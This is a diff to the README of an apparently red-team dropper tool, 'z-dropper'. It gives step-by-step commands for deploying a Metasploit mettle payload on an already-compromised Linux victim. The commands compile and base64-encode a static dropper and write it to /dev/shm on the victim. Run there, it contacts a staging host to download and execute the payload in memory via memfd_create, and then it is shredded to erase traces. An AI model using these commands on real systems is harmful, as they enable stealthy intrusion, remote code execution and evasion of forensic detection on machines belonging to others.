@@ -32,31 +32,38 @@ c2$ msfconsole -r mettle-handler.rc
 
 Assumptions:
 
- - Only `z-dropper` binary touches the victime's disk.
- - Payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` syscall (directly from memory).
+ - Red Team member has already achieved remote `/bin/sh` access to the victim machine.
+ - Only `z-dropper` is dropped on the victim's filesystem (though only on `tmpfs`).
+ - Main payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` syscall (directly from memory).
 
-C version:
+Preparing C version:
 
 ```
-# Getting z-dropper:
-wget sdf
+# Getting z-dropper source file:
+wget https://raw.githubusercontent.com/mzet-/z-dropper/main/z-dropper-case1.c
 
-# On the redteamer machine (using C implementation):
-redteamer$ EXE=z-dropper-case1; zig cc -static -Os -target x86_64-linux-musl ${EXE}.c -o $EXE; strip -x -R -s -g $EXE; echo; cat "$EXE" | base64 -w 0; echo; echo
-
-# On the redteamer machine (using Zig implementation):
-zig build-exe -OReleaseSmall --strip z-dropper-case1.zig
+# Compilation and base64 encoding:
+EXE=z-dropper-case1; zig cc -static -Os -target x86_64-linux-musl ${EXE}.c -o $EXE; strip -x -R -s -g $EXE; echo; cat "$EXE" | base64 -w 0; echo; echo
 
 # On the victim machine (where `<BASE64_ENCODED_BIN>` is taken from previous step):
-victim$ echo -n '<BASE64_ENCODED_BIN>' | base64 -d >/dev/shm/s; chmod +x /dev/shm/s; /dev/shm/s <STAGING_IP> 443; shred -u -f -z /dev/shm/s
+echo -n '<BASE64_ENCODED_BIN>' | base64 -d >/dev/shm/s; chmod +x /dev/shm/s; /dev/shm/s <STAGING_IP> 443; shred -u -f -z /dev/shm/s
 ```
 
-Zig version:
+Preparing Zig version:
+
+```
+# Compilation and base64 encoding:
+EXE=z-dropper-case1; zig build-exe -OReleaseSmall --strip ${EXE}.zig; echo; cat "$EXE" | base64 -w 0; echo; echo
+
+# On the victim machine (where `<BASE64_ENCODED_BIN>` is taken from previous step):
+echo -n '<BASE64_ENCODED_BIN>' | base64 -d >/dev/shm/s; chmod +x /dev/shm/s; /dev/shm/s <STAGING_IP> 443; shred -u -f -z /dev/shm/s
+```
 
 ## Case 2
 
 Assumptions:
 
- - Pure fileless execution.
+ - Red Team member has already achieved remote `/bin/sh` access to the victim machine.
+ - Pure fileless execution (with the help of Python interpreter)
  - Python 3 interpreter is required on the victim machine. 
  - Payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` syscall using Python's `ctype` module.
